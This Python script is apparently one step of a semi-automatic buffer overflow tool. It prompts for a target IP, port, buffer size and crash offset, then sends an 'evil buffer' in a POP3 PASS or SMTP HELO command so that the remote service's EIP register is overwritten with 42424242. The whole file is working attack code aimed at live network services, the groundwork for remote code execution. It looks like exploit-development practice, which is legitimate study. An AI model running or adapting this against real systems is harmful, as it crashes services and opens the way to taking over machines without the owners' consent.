#!/usr/bin/python3.6
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket

print("The pupose of this step is to verify that we can overwrite EIP with B's (42's in hex) and that our break point is correct.")
ipaddr  = input("What is the ip of the machine you are trying to verify the break point of?\n> ")
portnum = input("What is the port number of the application you are trying to verify the break point of?\n> ")
portnum = int(portnum)
bytes   = input("How many bytes (letters) would you like to send (verified in step 2)?\n> ")
bytes   = int(bytes)
location	= input("What was the crash location (info from step 3)?\n> ")
location	= int(location)
s	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
difference	= bytes	- location
buffer	= "A" * location + "B" * 4 + "C" * difference
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "


try:
	print("\nSending evil buffer...")
	s.connect((ipaddr, portnum))
	data = s.recv(1024)
	a       = "USER username" + "\r\n"
	s.send(a.encode())
	data = s.recv(1024)
	b       = service_greeting + buffer +"\r\n"
	s.send(b.encode())
	print("\nDone! EIP should now be overwritten with 42424242")
except:
	print("Could not connect to POP3!")


